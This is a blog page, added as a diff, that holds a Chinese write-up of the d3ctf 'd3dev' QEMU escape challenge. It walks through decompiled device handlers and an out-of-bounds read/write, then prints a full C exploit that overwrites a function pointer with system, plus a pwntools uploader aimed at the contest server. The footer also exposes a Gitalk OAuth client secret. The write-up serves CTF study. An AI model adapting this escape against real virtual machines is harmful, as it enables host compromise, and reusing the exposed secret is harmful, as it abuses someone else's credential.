@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>d3ctf-qemu逃逸-d3dev writeup - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="d3ctf pwn题 d3dev writeupqemu逃逸详细利用过程">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="d3ctf-qemu逃逸-d3dev writeup">
+<meta property="og:url" content="http://shiroinu.top/2021/03/07/d3ctf-qemu-escape-d3dev-writeup/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="d3ctf pwn题 d3dev writeupqemu逃逸详细利用过程">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-03-07T10:55:12.159Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="d3ctf-qemu逃逸-d3dev writeup">
+<meta name="twitter:description" content="d3ctf pwn题 d3dev writeupqemu逃逸详细利用过程">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1615121782842">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>20</div>
+        <div><span>标签</span>2</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>d3ctf-qemu逃逸-d3dev writeup</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年03月07日</a>
+    <a><i class="nexmoefont icon-areachart"></i>2.6k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 14 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>d3ctf pwn题 d3dev writeup<br>qemu逃逸详细利用过程</p>
+<a id="more"></a>
+
+<p>[TOC]</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>建议阅读</p>
+<blockquote>
+<p> <a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0</a></p>
+</blockquote>
+<p>简单总结一下的话就是qemu逃逸的题目会加载一个设备,并且编写和这个设备进行读写交互的函数,漏洞就出在那几个函数里面,利用方式和kernel pwn类似,用c编写和设备交互的代码,控制程序执行流.</p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><h2 id="launch-sh"><a href="#launch-sh" class="headerlink" title="launch.sh"></a>launch.sh</h2><pre><code class="bash">#!/bin/sh
+./qemu-system-x86_64 \
+-L pc-bios/ \
+-s \
+-m 128M \
+-kernel vmlinuz \
+-initrd rootfs.img \
+-smp 1 \
+-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot; \
+-device d3dev \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic \</code></pre>
+<p>注意<code>-device d3dev</code>这一行,设备名字就叫d3dev</p>
+<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><p>一开始想在16.04上跑qemu,结果显示少<code>libncursesw.so.6</code>.</p>
+<p>题目有提供<code>dockerfile</code>,但是这样调试不方便,最后选择用最新的<code>pwndocker</code>跑,需要额外装两个库</p>
+<pre><code class="bash">apt install libpixman-1-dev
+apt install libsnappy-dev</code></pre>
+<p>之后就可以跑<code>launch.sh</code>了</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用IDA7.5打开qemu-system-x86_64,等到分析完毕之后在左边函数列表搜索<code>d3dev</code>,就能见到相关的函数</p>
+<pre><code class="c">d3dev_class_init
+d3dev_instance_init
+d3dev_mmio_read
+d3dev_mmio_write
+d3dev_pmio_read
+d3dev_pmio_write
+do_qemu_init_pci_d3dev_register_types
+pci_d3dev_realize
+pci_d3dev_register_types</code></pre>
+<p>先进入<code>d3dev_class_init</code>函数,将v2的类型修改为<code>PCIDeviceClass *</code>,就可以看到设备初始化的相关信息.</p>
+<pre><code class="c">void __fastcall d3dev_class_init(ObjectClass_0 *a1, void *data)
+{
+  PCIDeviceClass *v2; // rax
+
+  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
+                           a1,
+                           (const char *)&amp;env.tlb_table[1][115]._anon_0.dummy[31],
+                           &quot;/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c&quot;,
+                           229,
+                           &quot;d3dev_class_init&quot;);
+  v2-&gt;realize = pci_d3dev_realize;
+  v2-&gt;exit = 0LL;
+  *(_DWORD *)&amp;v2-&gt;vendor_id = 0x11E82333;
+  v2-&gt;revision = 0x10;
+  v2-&gt;class_id = 0xFF;
+}</code></pre>
+<p>在qemu中执行<code>lspci</code>执行查看设备信息</p>
+<pre><code class="bash">/ # lspci
+00:01.0 Class 0601: 8086:7000
+00:04.0 Class 0200: 8086:100e
+00:00.0 Class 0600: 8086:1237
+00:01.3 Class 0680: 8086:7113
+00:03.0 Class 00ff: 2333:11e8
+00:01.1 Class 0101: 8086:7010
+00:02.0 Class 0300: 1234:1111
+</code></pre>
+<p>根据init函数中的信息比对发现可以确定是<code>00:03.0 Class 00ff: 2333:11e8</code></p>
+<p>然后输入<code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code></p>
+<pre><code class="bash">/ # cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
+0x00000000febf1000 0x00000000febf17ff 0x0000000000040200
+0x000000000000c040 0x000000000000c05f 0x0000000000040101
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000</code></pre>
+<p>确定了PMIO端口号是从<code>c040-c05f</code>,MMIO地址空间是<code>febf1000 - febf17ff</code></p>
+<p>然后就可以分析这个设备的读写函数了,漏洞就出在读写函数中.</p>
+<pre><code class="c">uint64_t __fastcall d3dev_mmio_read(struct d3devState *opaque, hwaddr addr, unsigned int size)
+{
+  uint64_t block_seeked; // rax
+  unsigned int v4; // esi
+  unsigned int x; // ecx
+  uint64_t y; // rax
+
+  block_seeked = opaque-&gt;blocks[opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3)];
+  v4 = 0xC6EF3720;
+  x = block_seeked;                             // X
+  y = HIDWORD(block_seeked);                    // Y
+  do
+  {
+    LODWORD(y) = y - ((x + v4) ^ (opaque-&gt;key[3] + (x &gt;&gt; 5)) ^ (opaque-&gt;key[2] + 16 * x));
+    x -= (y + v4) ^ (opaque-&gt;key[1] + ((unsigned int)y &gt;&gt; 5)) ^ (opaque-&gt;key[0] + 16 * y);
+    v4 += 0x61C88647;                           // range(20) v4 = 0x D 0000 0000 == 0
+  }
+  while ( v4 );
+  if ( opaque-&gt;mmio_read_part )
+  {
+    opaque-&gt;mmio_read_part = 0;
+    y = (unsigned int)y;
+  }
+  else
+  {
+    opaque-&gt;mmio_read_part = 1;
+    y = x;
+  }
+  return y;
+}
+
+
+
+void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+{
+  __int64 v4; // rsi
+  ObjectClass_0 **v5; // r11
+  uint64_t v6; // rdx
+  int i; // esi
+  uint32_t key0; // er10
+  uint32_t key1; // er9
+  uint32_t key2; // er8
+  uint32_t key3; // edi
+  unsigned int x; // ecx
+  uint64_t y; // rax
+
+  if ( size == 4 )
+  {
+    v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);
+    if ( opaque-&gt;mmio_write_part )
+    {
+      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;
+      v6 = val &lt;&lt; 32;
+      i = 0;
+      opaque-&gt;mmio_write_part = 0;
+      key0 = opaque-&gt;key[0];
+      key1 = opaque-&gt;key[1];
+      key2 = opaque-&gt;key[2];
+      key3 = opaque-&gt;key[3];
+      x = v6 + *((_DWORD *)v5 + 0x2B6);
+      y = ((unsigned __int64)v5[0x15B] + v6) &gt;&gt; 32;
+      do
+      {
+        i -= 0x61C88647;
+        x += (i + y) ^ (key1 + ((unsigned int)y &gt;&gt; 5)) ^ (key0 + 16 * y);
+        LODWORD(y) = ((i + x) ^ (key3 + (x &gt;&gt; 5)) ^ (key2 + 16 * x)) + y;
+      }
+      while ( i != 0xC6EF3720 );                // range(20)
+      v5[0x15B] = (ObjectClass_0 *)__PAIR64__(y, x);
+    }
+    else
+    {
+      opaque-&gt;mmio_write_part = 1;
+      opaque-&gt;blocks[v4] = (unsigned int)val;
+    }
+  }
+}
+
+
+
+
+
+void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+{
+  uint32_t *v4; // rbp
+
+  if ( addr == 8 )
+  {
+    if ( val &lt;= 0x100 )
+      opaque-&gt;seek = val;
+  }
+  else if ( addr &gt; 8 )
+  {
+    if ( addr == 28 )
+    {
+      opaque-&gt;r_seed = val;
+      v4 = opaque-&gt;key;
+      do
+        *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)(
+                  &amp;opaque-&gt;r_seed,
+                  28LL,
+                  val,
+                  *(_QWORD *)&amp;size);
+      while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r );
+    }
+  }
+  else if ( addr )
+  {
+    if ( addr == 4 )
+    {
+      *(_QWORD *)opaque-&gt;key = 0LL;
+      *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL;
+    }
+  }
+  else
+  {
+    opaque-&gt;memory_mode = val;
+  }
+}</code></pre>
+<p>其中可以将<code>void * opaque</code>的类型修改为<code>struct d3devState*</code>,一开始在struct列表中会搜索不到<code>d3devState</code></p>
+<p>解决方法参照<a href="https://www.anquanke.com/post/id/197650#h2-9" target="_blank" rel="noopener">这份wp下面的评论</a></p>
+<blockquote>
+<p>这儿有个坑忘提了. IDA 貌似有些结构体不会解析到idb数据库中, 得自己添加. 方法如下: View -&gt; Open Subviews -&gt; Local Types. 然后搜索 STRNGState 就能找到了. (如果找不到的话可能这个符号被去掉了, 可能只能自己新建) 双击添加进 Database 即可</p>
+</blockquote>
+<p>同样步骤,搜索d3devState就行.</p>
+<p>越界读漏洞出在<code>d3dev_mmio_read</code>函数中</p>
+<p><code>block_seeked = opaque-&gt;blocks[opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3)];</code></p>
+<p>其中的<code>seek</code>在<code>d3dev_pmio_write</code>中可控,范围是0到0x100</p>
+<pre><code class="c">  if ( addr == 8 )
+  {
+    if ( val &lt;= 0x100 )
+      opaque-&gt;seek = val;
+  }</code></pre>
+<p>因此可以越界读数据,可读取的内容可以在gdb中调试查看:</p>
+<pre><code class="c">  memory_mode = 0,
+  seek = 0,
+  init_flag = 1,
+  mmio_read_part = 0,
+  mmio_write_part = 0,
+  r_seed = 0,
+  blocks = {0 &lt;repeats 257 times&gt;},
+  key = {271647815, 157742283, 1457023107, 1189018626},
+  rand_r = 0x7f143691deb0 &lt;rand_r&gt;
+}
+pwndbg&gt; 
+</code></pre>
+<p>显然可以通过<code>rand_r</code>获取libc的地址.</p>
+<p>越界写漏洞出现在<code>d3dev_mmio_write</code>中,与<code>mmio_read</code>的漏洞点相同.</p>
+<p><code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>有越界读写,并且在<code>d3dev_pmio_write</code>函数中有<code>rand_r</code>函数指针的调用,思路就很明显了,先泄露libc地址,然后越界写<code>rand_r</code>指针为system,最后调用即可.</p>
+<p>在利用时有几个细节值得注意:</p>
+<ol>
+<li><p>mmio_read以及mmio_write的过程经过了加解密,read是将内容加密后分两次传回,write是将密文分两次读入后解密再写入.</p>
+</li>
+<li><p><code>d3dev_pmio_write</code>中可以将加解密中的key设置成0,极大提高分析效率.</p>
+</li>
+<li><p>因为<code>r_seed</code>和<code>blocks</code>内存地址连续,因此可以将字符串连起来写入<code>r_seed</code>和<code>block[0]</code>中,然后触发调用<code>rand_r</code></p>
+<pre><code class="bash">pwndbg&gt; p &amp;((d3devState *)$rdi).r_seed 
+$2 = (uint32_t *) 0x5598a2141b34
+pwndbg&gt; p &amp;((d3devState *)$rdi).blocks 
+$3 = (uint64_t (*)[257]) 0x5598a2141b38</code></pre>
+</li>
+</ol>
+<h1 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h1><p>文件系统相关的话,与kernel题目一样,先解压(推荐单独开个文件夹)</p>
+<p><code>cpio -idmv &lt; rootfs.img</code></p>
+<p>然后将exp写好后放进fs文件夹中</p>
+<p><code>gcc -O0 -o exp -static d3dev.c</code></p>
+<p>之后打包</p>
+<p><code>find . | cpio -o --format=newc &gt; ../rootfs.img</code></p>
+<p>重新跑<code>launch.sh</code>就行了</p>
+<p>我本地的环境是20.04的pwndocker + pwngdb + tmux,在启动qemu之后tmux新开窗口,然后<code>ps -ax</code></p>
+<pre><code class="bash">ID TTY      STAT   TIME COMMAND
+     1 ?        Ss     0:00 /usr/bin/python3 -u /sbin/my_init
+    13 ?        S      0:01 /usr/sbin/syslog-ng --pidfile /var/run/syslog-ng.pid -F --no-caps
+    27 ?        S      0:00 /usr/bin/runsvdir -P /etc/service
+    28 ?        Ss     0:00 runsv sshd
+    29 ?        Ss     0:00 runsv cron
+    30 ?        S      0:00 /usr/sbin/cron -f
+    33 pts/0    Ss     0:00 /bin/bash
+    45 pts/0    S+     0:00 tmux
+    47 ?        Ss     0:10 tmux
+   787 pts/2    Ss     0:00 -bash
+   830 pts/2    S+     0:00 /bin/sh ./launch.sh
+   831 pts/2    Sl+    0:10 ./qemu-system-x86_64 -L pc-bios/ -s -m 128M -kernel vmlinuz -initr
+   838 pts/1    Ss     0:00 -bash
+   871 pts/1    R+     0:00 ps -ax
+</code></pre>
+<p>找到qemu的pid后<code>gdb attach 831</code>即可下断点调试,在qemu中执行exp即可被断下.</p>
+<p>调试时查看结构体可以在d3dev相关函数断点下</p>
+<p><code>p *((d3devState *)$rdi)</code></p>
+<p>就可以查看了</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>exp模版来自于<a href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c" target="_blank" rel="noopener">这里</a></p>
+<pre><code class="c">#include &lt;assert.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;inttypes.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/io.h&gt;
+
+unsigned char* mmio_mem;
+uint32_t pmio_base = 0xc040; //cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
+uint32_t keys[4] = {0};
+uint64_t libc_base ;
+void die(const char* msg)
+{
+    perror(msg);
+    exit(-1);
+}
+
+void mmio_write(uint32_t addr, uint32_t value)
+{
+    *((uint32_t*)(mmio_mem + addr)) = value;
+}
+
+uint32_t mmio_read(uint32_t addr)
+{
+    return *((uint32_t*)(mmio_mem + addr));
+}
+
+void pmio_write(uint32_t addr, uint32_t value)
+{
+    outl(value,addr);
+}
+
+
+uint32_t pmio_read(uint32_t addr)
+{
+    return (uint32_t)inl(addr);
+}
+
+uint32_t pmio_arbread(uint32_t offset)
+{
+    pmio_write(pmio_base+0,offset);
+    return pmio_read(pmio_base+4);
+}
+
+void pmio_abwrite(uint32_t offset, uint32_t value)
+{
+    pmio_write(pmio_base+0,offset);
+    pmio_write(pmio_base+4,value);
+}
+
+void reset_keys()
+{
+    uint32_t seed = 0;
+    for(int i = 0;i&lt;4;++i)
+    {
+        keys[i] = rand_r(&amp;seed);
+        printf(&quot;keys[%d] test = %p\n&quot;,i, keys[i]);
+    }
+    pmio_write(28 + pmio_base,0);
+    pmio_write(4 + pmio_base,0);
+    return ;
+
+}
+
+void set_seek_off(uint32_t offset)
+{
+    pmio_write(8 + pmio_base,offset);
+}
+uint64_t decrypt(uint32_t x, uint64_t y)
+{
+    uint32_t i = 0;
+    do
+    {
+        i -=0x61C88647;
+        x += (i + y) ^ ( ((unsigned int)y &gt;&gt; 5)) ^ (  y &lt;&lt; 4);
+        y = (uint32_t)(((i + x) ^ ((x &gt;&gt; 5)) ^ (  x &lt;&lt; 4)) + y);
+    } while (i != 0xC6EF3720);
+
+    printf(&quot;x = %p, y = %p , i = %p\n&quot;,x,y,i);
+    uint64_t ans = (y &lt;&lt; 32) + x;
+    printf(&quot;ans = %p\n&quot;,ans);
+    return ans - 0x4AEB0;
+}
+uint64_t encrypt(uint64_t rr)
+{
+    uint32_t i , x ;
+    uint64_t y;
+
+    i  = 0xC6EF3720;
+    x = rr &amp; 0xffffffff ; 
+    y = rr &gt;&gt; 32 ;
+    do
+    {
+        y = (uint32_t)(y - ((x + i) ^ (x &gt;&gt; 5) ^ ( x &lt;&lt; 4 )));
+        x = x - (((y + i) ^ (y &gt;&gt; 5) ^ ( y &lt;&lt; 4 ) )) ;
+        i = i + 0x61C88647;
+    } while (i);
+    printf(&quot;x = %p, y = %p , i = %p\n&quot;,x,y,i);
+    return  (y &lt;&lt; 32) + x;
+
+}
+int main(int argc, char *argv[])
+{
+    uint32_t tmp = 0xdeadbeef;
+    uint32_t tmp1 = 0;
+    uint32_t tmp2 = 0;
+
+    // Open and map I/O memory for the strng device
+    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);
+    if (mmio_fd == -1)
+        die(&quot;mmio_fd open failed&quot;);
+
+    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED)
+        die(&quot;mmap mmio_mem failed&quot;);
+
+    printf(&quot;mmio_mem @ %p\n&quot;, mmio_mem);
+
+    tmp = mmio_read(24);
+    printf(&quot;tmp test = %p\n&quot;, tmp);
+
+    // Open and map I/O memory for the strng device
+    if (iopl(3) !=0 )
+        die(&quot;I/O permission is not enough&quot;);
+
+    reset_keys();
+    set_seek_off(0x100);
+    // get rand_r 
+    uint64_t yy;
+    uint32_t xx;
+    yy = mmio_read(24);
+    printf(&quot;tmp1 test = %p\n&quot;, yy); // part 1
+    xx = mmio_read(24);
+    printf(&quot;tmp2 test = %p\n&quot;, xx); // part 2 high
+    libc_base = decrypt(xx,yy);
+    printf(&quot;libc_base = %p\n&quot;,libc_base);
+    uint64_t system = libc_base + 0x0000000000055410;
+    printf(&quot;system = %p\n&quot;,system);
+
+    mmio_write(24, (uint32_t)(encrypt(system)));
+    mmio_write(24, (uint32_t)(encrypt(system) &gt;&gt; 32));
+    // char sed[4] = &quot;cat &quot;;
+    // char flag[8] = &quot;/home/ct&quot;;
+    // char flag2[8] = &quot;f/flag\x00&quot;;
+    uint32_t flag1 = 0x20746163; //&quot;cat &quot;
+    uint64_t flag2 = 0x67616c66; // &quot;flag&quot;
+    // uint64_t flag3 = 0x67616c662f66;
+    set_seek_off(0);
+    mmio_write(0, (uint32_t)(encrypt(flag2)));
+    mmio_write(0, (uint32_t)(encrypt(flag2) &gt;&gt; 32));
+
+    // mmio_write(8, (uint32_t)(encrypt(flag3)));
+    // mmio_write(8, (uint32_t)(encrypt(flag3) &gt;&gt; 32));
+
+
+    pmio_write(28 + pmio_base,flag1);
+
+
+
+
+
+
+}</code></pre>
+<h1 id="远程传exp"><a href="#远程传exp" class="headerlink" title="远程传exp"></a>远程传exp</h1><p>远程脚本来自于<a href="https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">这里</a></p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+import os
+
+context.log_level = &#39;debug&#39;
+cmd = &#39;/ #&#39;
+
+
+def exploit(r):
+    r.sendlineafter(cmd, &#39;stty -echo&#39;)
+    os.system(&#39;gcc -static -O0 ./d3dev.c -o ./exp&#39;)
+    os.system(&#39;gzip -c ./exp &gt; ./exp.gz&#39;)
+    r.sendlineafter(cmd, &#39;cat &lt;&lt;EOF &gt; exp.gz.b64&#39;)
+    r.sendline((read(&#39;./exp.gz&#39;)).encode(&#39;base64&#39;))
+    r.sendline(&#39;EOF&#39;)
+    r.sendlineafter(cmd, &#39;base64 -d exp.gz.b64 &gt; exp.gz&#39;)
+    r.sendlineafter(cmd, &#39;gunzip ./exp.gz&#39;)
+    r.sendlineafter(cmd, &#39;chmod +x ./exp&#39;)
+    r.sendlineafter(cmd, &#39;./exp&#39;)
+    r.interactive()
+
+
+# p = process(&#39;./startvm.sh&#39;, shell=True)
+p = remote(&#39;106.14.216.214&#39;,50273)
+
+exploit(p)</code></pre>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.giantbranch.cn/2020/01/13/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E7%BA%BF%E4%B8%8A%E8%B5%9Bqwct/" target="_blank" rel="noopener">https://www.giantbranch.cn/2020/01/13/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E7%BA%BF%E4%B8%8A%E8%B5%9Bqwct/</a></p>
+<p><a href="https://ray-cp.github.io/archivers/qemu-pwn-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E4%B8%A4%E9%81%93qemu%E9%80%83%E9%80%B8%E9%A2%98writeup#%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E4%B8%A4%E9%81%93qemu%E9%80%83%E9%80%B8%E9%A2%98writeup#%E5%88%86%E6%9E%90</a></p>
+<p><a href="https://www.anquanke.com/post/id/197650#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197650#h2-0</a></p>
+<p><a href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup#%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup#%E5%88%86%E6%9E%90</a></p>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1615121782845"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
